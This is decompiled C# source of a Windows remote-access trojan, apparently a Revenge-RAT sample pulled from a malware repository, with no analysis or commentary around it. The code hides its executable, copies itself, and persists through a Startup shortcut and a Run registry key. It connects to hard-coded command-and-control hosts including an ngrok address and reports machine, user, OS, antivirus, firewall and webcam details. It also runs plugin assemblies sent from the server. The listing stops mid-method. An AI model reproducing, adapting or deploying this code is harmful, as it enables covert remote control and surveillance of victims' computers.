// Decompiled with JetBrains decompiler
// Type: Nuclear_Explosion.Atomic
// Assembly: Nuclear Explosion, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EC508B10-743C-4449-896E-007273DD99B4
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.RRAT.gen-a118f361223ac18069b6aeb89baec7e918a99b42ea171250c3e9bc4c314a8b2e.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Nuclear_Explosion
{
  public class Atomic
  {
    public bool OW;
    public object C;
    public bool Cn;
    public object SC;
    public Thread PT;
    public Thread INST;
    public int I;
    public int MS;
    public string[] Hosts;
    public string[] Ports;
    public string ID;
    public string MUTEX;
    public int H;
    public int P;
    public static string SPL = "*-]NK[-*";
    public static string App = Application.ExecutablePath;
    public static Atomic SCG = new Atomic();
    public static ComputerInfo DI = new ComputerInfo();
    public static string Key = "Revenge-RAT";
    public static Mutex MT;

    public Atomic()
    {
      this.OW = false;
      this.C = (object) null;
      this.Cn = false;
      this.SC = (object) new Thread(new ThreadStart(this.MAC), 1);
      this.PT = new Thread(new ThreadStart(this.Pin));
      this.INST = new Thread(new ThreadStart(this.INS));
      this.I = 1;
      this.MS = 0;
      this.Hosts = Strings.Split("127.0.0.1,4.tcp.ngrok.io,", ",");
      this.Ports = Strings.Split("333,16025,", ",");
      this.ID = "R3Vlc3Q=";
      this.MUTEX = "RV_MUTEX";
      this.H = 0;
      this.P = 0;
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        System.IO.File.SetAttributes(Atomic.App, FileAttributes.Hidden | FileAttributes.System);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Atomic.SCG.Execute();
    }

    public void Execute()
    {
      NewLateBinding.LateCall(this.SC, (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      this.PT.Start();
      this.INST.Start();
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void INS()
    {
      try
      {
        Atomic.MT = new Mutex(true, this.MUTEX, out this.OW);
        if (!this.OW)
        {
          ProjectData.EndApp();
          EventHandler eventHandler;
          // ISSUE: reference to a compiler-generated field
          if (Atomic._Closure\u0024__.\u0024IR24\u002D1 != null)
          {
            // ISSUE: reference to a compiler-generated field
            eventHandler = Atomic._Closure\u0024__.\u0024IR24\u002D1;
          }
          else
          {
            // ISSUE: reference to a compiler-generated field
            Atomic._Closure\u0024__.\u0024IR24\u002D1 = eventHandler = (EventHandler) ((a0, a1) =>
            {
              // ISSUE: variable of a compiler-generated type
              VB\u0024AnonymousDelegate_0 anonymousDelegate0;
              // ISSUE: reference to a compiler-generated field
              if (Atomic._Closure\u0024__.\u0024I24\u002D0 != null)
              {
                // ISSUE: reference to a compiler-generated field
                anonymousDelegate0 = Atomic._Closure\u0024__.\u0024I24\u002D0;
              }
              else
              {
                // ISSUE: reference to a compiler-generated field
                Atomic._Closure\u0024__.\u0024I24\u002D0 = anonymousDelegate0 = (VB\u0024AnonymousDelegate_0) (() => Atomic.MT.ReleaseMutex());
              }
              anonymousDelegate0();
            });
          }
          Application.ApplicationExit += eventHandler;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Thread.Sleep(35000);
      string empty = string.Empty;
      try
      {
        string str = Environment.GetFolderPath((Environment.SpecialFolder) Conversions.ToInteger("37")) + "\\Cliessvnt.exe";
        System.IO.File.Copy(Atomic.App, str, true);
        Process.Start(str);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell"), (System.Type) null, "CreateShortcut", new object[1]
        {
          (object) (Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\WindowsXP.URL")
        }, (string[]) null, (System.Type[]) null, (bool[]) null));
        NewLateBinding.LateSet(objectValue, (System.Type) null, "TargetPath", new object[1]
        {
          (object) Atomic.App
        }, (string[]) null, (System.Type[]) null);
        NewLateBinding.LateCall(objectValue, (System.Type) null, "Save", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.IR("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Cslient", Atomic.App);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Pin()
    {
      while (true)
      {
        if (this.I == 0)
        {
          // ISSUE: variable of a reference type
          int& local;
          // ISSUE: explicit reference operation
          int num = checked (^(local = ref this.MS) + 1);
          local = num;
        }
        Thread.Sleep(1);
      }
    }

    public void data(byte[] b)
    {
      string[] strArray = Strings.Split(this.BS(b), Atomic.Key);
      if (Operators.CompareString(strArray[0], "PNC", false) == 0)
      {
        this.I = 0;
        this.Send("PNC");
      }
      else if (Operators.CompareString(strArray[0], "P", false) == 0)
      {
        this.I = 1;
        this.Send("P" + Atomic.Key + Conversions.ToString(this.MS));
        this.MS = 0;
        this.Send("W" + Atomic.Key + this.GAW());
      }
      else if (Operators.CompareString(strArray[0], "IE", false) == 0)
      {
        if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "Software\\", this.Encode(this.MUTEX)), (object) "\\"), (object) strArray[1])), true) != null)
        {
          try
          {
            this.INV(this.Hosts[this.H], this.Ports[this.P], strArray[4], strArray[5], Conversions.ToString(this.Encode(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.Decode(this.ID), (object) "_"), (object) this.HWD())))), Registry.GetValue(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "HKEY_CURRENT_USER\\SOFTWARE\\", this.Encode(this.MUTEX)), (object) "\\"), (object) strArray[1])), strArray[1], (object) null).ToString(), Conversions.ToInteger(strArray[2]), Conversions.ToBoolean(strArray[3]), strArray[1], true);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            this.Send("GPL" + Atomic.Key + strArray[5] + Atomic.Key + strArray[1] + Atomic.Key + Conversions.ToString(false));
            ProjectData.ClearProjectError();
          }
        }
        else
          this.Send("GPL" + Atomic.Key + strArray[5] + Atomic.Key + strArray[1] + Atomic.Key + Conversions.ToString(false));
      }
      else if (Operators.CompareString(strArray[0], "LP", false) == 0)
      {
        this.INV(this.Hosts[this.H], this.Ports[this.P], strArray[1], strArray[2], Conversions.ToString(this.Encode(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.Decode(this.ID), (object) "_"), (object) this.HWD())))), strArray[3], Conversions.ToInteger(strArray[4]), Conversions.ToBoolean(strArray[5]), strArray[6], Conversions.ToBoolean(strArray[7]));
      }
      else
      {
        if (Operators.CompareString(strArray[0], "UNV", false) != 0)
          return;
        // ISSUE: variable of a reference type
        string& local1;
        object[] objArray1;
        bool[] flagArray1;
        // ISSUE: explicit reference operation
        object Instance = NewLateBinding.LateGet(this.LA(strArray[1]), (System.Type) null, "CreateInstance", objArray1 = new object[1]
        {
          (object) ^(local1 = ref strArray[2])
        }, (string[]) null, (System.Type[]) null, flagArray1 = new bool[1]
        {
          true
        });
        if (flagArray1[0])
          local1 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (string));
        // ISSUE: variable of a reference type
        string& local2;
        // ISSUE: variable of a reference type
        string& local3;
        // ISSUE: variable of a reference type
        string& local4;
        // ISSUE: variable of a reference type
        string& local5;
        // ISSUE: variable of a reference type
        string& local6;
        // ISSUE: variable of a reference type
        string& local7;
        // ISSUE: variable of a reference type
        string& local8;
        // ISSUE: variable of a reference type
        string& local9;
        // ISSUE: variable of a reference type
        string& local10;
        // ISSUE: variable of a reference type
        string& local11;
        // ISSUE: variable of a reference type
        string& local12;
        object[] objArray2;
        bool[] flagArray2;
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        // ISSUE: explicit reference operation
        NewLateBinding.LateCall(Instance, (System.Type) null, "UNI", objArray2 = new object[43]
        {
          this.Encode(this.MUTEX),
          (object) ^(local2 = ref strArray[3]),
          (object) "True",
          (object) "37",
          (object) "Cliessvnt.exe",
          (object) "True",
          (object) "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
          (object) "Cslient",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "",
          (object) "True",
          (object) "WindowsXP",
          (object) "",
          (object) "",
          null,
          null,
          null,
          null,
          null,
          (object) ^(local3 = ref strArray[4]),
          (object) ^(local4 = ref strArray[5]),
          (object) Atomic.App,
          (object) ^(local5 = ref strArray[6]),
          (object) ^(local6 = ref strArray[7]),
          (object) ^(local7 = ref strArray[8]),
          (object) ^(local8 = ref strArray[9]),
          (object) ^(local9 = ref strArray[10]),
          (object) ^(local10 = ref strArray[11]),
          (object) ^(local11 = ref strArray[12]),
          (object) ^(local12 = ref strArray[13])
        }, (string[]) null, (System.Type[]) null, flagArray2 = new bool[43]
        {
          false,
          true,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          false,
          true,
          true,
          true,
          true,
          true,
          true,
          true,
          true,
          true,
          true,
          true
        }, true);
        if (flagArray2[1])
          local2 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[1]), typeof (string));
        if (flagArray2[32])
          local3 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[32]), typeof (string));
        if (flagArray2[33])
          local4 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[33]), typeof (string));
        if (flagArray2[34])
          Atomic.App = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[34]), typeof (string));
        if (flagArray2[35])
          local5 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[35]), typeof (string));
        if (flagArray2[36])
          local6 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[36]), typeof (string));
        if (flagArray2[37])
          local7 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[37]), typeof (string));
        if (flagArray2[38])
          local8 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[38]), typeof (string));
        if (flagArray2[39])
          local9 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[39]), typeof (string));
        if (flagArray2[40])
          local10 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[40]), typeof (string));
        if (flagArray2[41])
          local11 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[41]), typeof (string));
        if (flagArray2[42])
          local12 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[42]), typeof (string));
      }
    }

    public object INV(
      string H,
      string P,
      string N,
      string C,
      string ID,
      string Bytes,
      int S,
      bool M,
      string MD5,
      bool B)
    {
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall(NewLateBinding.LateGet(this.LA(Bytes), (System.Type) null, "CreateInstance", new object[2]
      {
        (object) (N + "." + C),
        (object) true
      }, (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Start", objArray = new object[6]
      {
        (object) ID,
        (object) S,
        (object) H,
        (object) P,
        (object) Atomic.Key,
        (object) Atomic.SPL
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[6]
      {
        true,
        true,
        true,
        true,
        true,
        true
      }, true);
      if (flagArray[0])
        ID = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
      if (flagArray[1])
        S = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (int));
      if (flagArray[2])
        H = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[2]), typeof (string));
      if (flagArray[3])
        P = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[3]), typeof (string));
      if (flagArray[4])
        Atomic.Key = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[4]), typeof (string));
      if (flagArray[5])
        Atomic.SPL = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[5]), typeof (string));
      if (M)
      {
        try
        {
          if (Registry.CurrentUser.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "Software\\", this.Encode(this.MUTEX)), (object) "\\"), (object) MD5)), true) == null)
            this.IR(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "HKEY_CURRENT_USER\\SOFTWARE\\", this.Encode(this.MUTEX)), (object) "\\"), (object) MD5)), MD5, Bytes);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        if (!B)
          this.IR(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "HKEY_CURRENT_USER\\SOFTWARE\\", this.Encode(this.MUTEX)), (object) "\\"), (object) MD5)), MD5, Bytes);
      }
      object obj;
      return obj;
    }

    public object LA(string B) => (object) Assembly.Load(this.Decompress(Convert.FromBase64String(B)));

    public object IR(string P, string N, string B)
    {
      try
      {
        Registry.SetValue(P, N, (object) B);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    public void MAC()
    {
      object Instance1 = (object) new MemoryStream();
      int num1 = 0;
label_1:
      while (true)
      {
        try
        {
          try
          {
            Atomic.EmptyWorkingSet((long) Process.GetCurrentProcess().Handle);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          if (this.C != null)
          {
            if (!Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Connected", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) false, false))
            {
              if (this.Cn)
              {
                checked { ++num1; }
                if (num1 > 150)
                {
                  num1 = 0;
                  if (Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Poll", new object[2]
                  {
                    (object) -1,
                    (object) SelectMode.SelectRead
                  }, (string[]) null, (System.Type[]) null, (bool[]) null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Available", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))))
                    break;
                }
                if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(this.C, (System.Type) null, "Available", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))
                {
                  byte[] numArray1 = new byte[checked (Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(this.C, (System.Type) null, "Available", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 1)) + 1)];
                  object[] objArray1;
                  bool[] flagArray1;
                  NewLateBinding.LateCall(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Receive", objArray1 = new object[4]
                  {
                    (object) numArray1,
                    (object) 0,
                    (object) numArray1.Length,
                    (object) SocketFlags.None
                  }, (string[]) null, (System.Type[]) null, flagArray1 = new bool[4]
                  {
                    true,
                    false,
                    false,
                    false
                  }, true);
                  if (flagArray1[0])
                    numArray1 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
                  object[] objArray2;
                  bool[] flagArray2;
                  NewLateBinding.LateCall(Instance1, (System.Type) null, "Write", objArray2 = new object[3]
                  {
                    (object) numArray1,
                    (object) 0,
                    (object) numArray1.Length
                  }, (string[]) null, (System.Type[]) null, flagArray2 = new bool[3]
                  {
                    true,
                    false,
                    false
                  }, true);
                  if (flagArray2[0])
                  {
                    byte[] numArray2 = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2[0]), typeof (byte[]));
                  }
                  while (this.BS((byte[]) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)).Contains(Atomic.SPL))
                  {
                    Array Instance2 = this.fx((byte[]) NewLateBinding.LateGet(Instance1, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), Atomic.SPL);
                    new Thread((ParameterizedThreadStart) (a0 => this.data((byte[]) a0))).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance2, new object[1]
                    {
                      (object) 0
                    }, (string[]) null)));
                    NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
                    Instance1 = (object) new MemoryStream();
                    if (Instance2.Length == 2)
                    {
                      object Instance3 = Instance1;
                      object[] Arguments1 = new object[3];
                      Array Instance4 = Instance2;
                      object obj;
                      Arguments1[0] = NewLateBinding.LateIndexGet((object) Instance4, new object[1]
                      {
                        (object) (__Boxed<int>) (obj = (object) 1)
                      }, (string[]) null);
                      Arguments1[1] = (object) 0;
                      Array Instance5 = Instance2;
                      object[] Arguments2 = new object[1]
                      {
                        (object) 1
                      };
                      object Instance6;
                      Arguments1[2] = NewLateBinding.LateGet(Instance6 = NewLateBinding.LateIndexGet((object) Instance5, Arguments2, (string[]) null), (System.Type) null, "length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
                      object[] objArray3 = Arguments1;
                      bool[] CopyBack;
                      bool[] flagArray3 = CopyBack = new bool[3]
                      {
                        true,
                        false,
                        true
                      };
                      NewLateBinding.LateCall(Instance3, (System.Type) null, "Write", Arguments1, (string[]) null, (System.Type[]) null, CopyBack, true);
                      if (flagArray3[0])
                        NewLateBinding.LateIndexSetComplex((object) Instance4, new object[2]
                        {
                          obj,
                          objArray3[0]
                        }, (string[]) null, true, false);
                      if (flagArray3[2])
                        NewLateBinding.LateSetComplex(Instance6, (System.Type) null, "length", new object[1]
                        {
                          objArray3[2]
                        }, (string[]) null, (System.Type[]) null, true, true);
                    }
                    else
                      break;
                  }
                }
              }
              else
                break;
            }
            else
              break;
          }
          else
            break;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          break;
        }
        Thread.Sleep(1);
      }
      while (true)
      {
        try
        {
          try
          {
            Atomic.EmptyWorkingSet((long) Process.GetCurrentProcess().Handle);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        this.Cn = false;
        try
        {
          NewLateBinding.LateCall(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Disconnect", new object[1]
          {
            (object) false
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
          NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        Instance1 = (object) new MemoryStream();
        bool flag1 = false;
        int num2 = checked (this.Hosts.Length - 2);
        int index = 0;
        bool flag2;
        while (index <= num2)
        {
          try
          {
            this.C = (object) new TcpClient()
            {
              ReceiveTimeout = -1,
              SendTimeout = -1,
              SendBufferSize = 999999,
              ReceiveBufferSize = 999999
            };
            num1 = 0;
            // ISSUE: variable of a reference type
            string& local1;
            // ISSUE: variable of a reference type
            string& local2;
            object[] objArray;
            bool[] flagArray;
            // ISSUE: explicit reference operation
            // ISSUE: explicit reference operation
            NewLateBinding.LateCall(this.CK(), (System.Type) null, "Connect", objArray = new object[2]
            {
              (object) ^(local1 = ref this.Hosts[index]),
              (object) ^(local2 = ref this.Ports[index])
            }, (string[]) null, (System.Type[]) null, flagArray = new bool[2]
            {
              true,
              true
            }, true);
            if (flagArray[0])
              local1 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
            if (flagArray[1])
              local2 = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
            this.Cn = true;
            NewLateBinding.LateCall((object) this, (System.Type) null, "Send", new object[1]
            {
              Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("Information" + Atomic.Key + this.ID + Atomic.Key), this.Encode("_" + this.HWD())), (object) Atomic.Key), this.IP()), (object) Atomic.Key), this.Encode(Environment.MachineName + " / " + Environment.UserName)), (object) Atomic.Key), (object) this.CIVC()), (object) Atomic.Key), this.Encode(Atomic.DI.OSFullName + " " + Atomic.OP())), (object) Atomic.Key), this.Encode(Conversions.ToString(this.MP()))), (object) Atomic.Key), (object) Atomic.DI.TotalPhysicalMemory), (object) Atomic.Key), (object) this.GetProduct("Select * from AntiVirusProduct")), (object) Atomic.Key), (object) this.GetProduct("SELECT * FROM FirewallProduct")), (object) Atomic.Key), (object) this.Ports[this.P]), (object) Atomic.Key), (object) this.GAW()), (object) Atomic.Key), this.Encode(CultureInfo.CurrentCulture.Name)), (object) Atomic.Key), (object) "False")
            }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
            this.H = index;
            this.P = index;
            flag2 = true;
            goto label_1;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Thread.Sleep(Conversions.ToInteger("2500"));
            this.H = 0;
            this.P = 0;
            ProjectData.ClearProjectError();
          }
          checked { ++index; }
        }
        if (flag1)
          flag2 = false;
        else
          goto label_1;
      }
    }

    public object CK() => NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);

    public void Send(byte[] b)
    {
      if (!this.Cn)
        return;
      try
      {
        object Instance1 = (object) new MemoryStream();
        object[] objArray1;
        bool[] flagArray1;
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Write", objArray1 = new object[3]
        {
          (object) b,
          (object) 0,
          (object) b.Length
        }, (string[]) null, (System.Type[]) null, flagArray1 = new bool[3]
        {
          true,
          false,
          false
        }, true);
        if (flagArray1[0])
          b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray1[0]), typeof (byte[]));
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Write", new object[3]
        {
          (object) this.SB(Atomic.SPL),
          (object) 0,
          (object) Atomic.SPL.Length
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        NewLateBinding.LateSetComplex(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "SendBufferSize", new object[1]
        {
          (object) b.Length
        }, (string[]) null, (System.Type[]) null, false, true);
        NewLateBinding.LateCall(NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Poll", new object[2]
        {
          (object) -1,
          (object) SelectMode.SelectWrite
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object Instance2 = NewLateBinding.LateGet(this.C, (System.Type) null, "Client", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
        object[] Arguments = new object[4];
        object Instance3 = Instance1;
        Arguments[0] = NewLateBinding.LateGet(Instance3, (System.Type) null, "ToArray", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
        Arguments[1] = (object) 0;
        object Instance4 = Instance1;
        Arguments[2] = NewLateBinding.LateGet(Instance4, (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
        Arguments[3] = (object) SocketFlags.None;
        object[] objArray2 = Arguments;
        bool[] CopyBack;
        bool[] flagArray2 = CopyBack = new bool[4]
        {
          true,
          false,
          true,
          false
        };
        NewLateBinding.LateCall(Instance2, (System.Type) null, nameof (Send), Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray2[0])
          NewLateBinding.LateSetComplex(Instance3, (System.Type) null, "ToArray", new object[1]
          {
            objArray2[0]
          }, (string[]) null, (System.Type[]) null, true, false);
        if (flagArray2[2])
          NewLateBinding.LateSetComplex(Instance4, (System.Type) null, "Length", new object[1]
          {
            objArray2[2]
          }, (string[]) null, (System.Type[]) null, true, false);
        NewLateBinding.LateCall(Instance1, (System.Type) null, "Dispose", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.Cn = false;
        ProjectData.ClearProjectError();
      }
    }

    public void Send(string S) => this.Send(this.SB(S));

    public object IP()
    {
      object obj;
      try
      {
        obj = (object) ((IPAddress) Dns.GetHostByName(Dns.GetHostName()).AddressList.GetValue(0)).ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "????";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    [DllImport("kernel32", EntryPoint = "GetVolumeInformationA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GVI(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string IP,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string V,
      int T,
      ref int H,
      ref int Q,
      ref int G,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string J,
      int X);

    [DllImport("user32", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GFW();

    [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    [DllImport("psapi")]
    public static extern bool EmptyWorkingSet(long hProcess);

    public string HWD()
    {
      string str1;
      try
      {
        string str2 = Interaction.Environ("SystemDrive") + "\\";
        ref string local1 = ref str2;
        string str3 = (string) null;
        ref string local2 = ref str3;
        int Number;
        ref int local3 = ref Number;
        int num1 = 0;
        ref int local4 = ref num1;
        int num2 = 0;
        ref int local5 = ref num2;
        string str4 = (string) null;
        ref string local6 = ref str4;
        Atomic.GVI(ref local1, ref local2, 0, ref local3, ref local4, ref local5, ref local6, 0);
        str1 = Conversion.Hex(Number);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = "ERR";
        ProjectData.ClearProjectError();
      }
      return str1;
    }

    public string CIVC()
    {
      try
      {
        int num = 0;
        do
        {
          int wDriver = (int) checked ((short) num);
          string str1 = Strings.Space(100);
          ref string local1 = ref str1;
          string str2 = (string) null;
          ref string local2 = ref str2;
          if (Atomic.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return "Yes";
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "No";
    }

    public static string OP()
    {
      string str;
      try
      {
        ManagementObjectCollection.ManagementObjectEnumerator enumerator;
        try
        {
          enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator();
          if (enumerator.MoveNext())
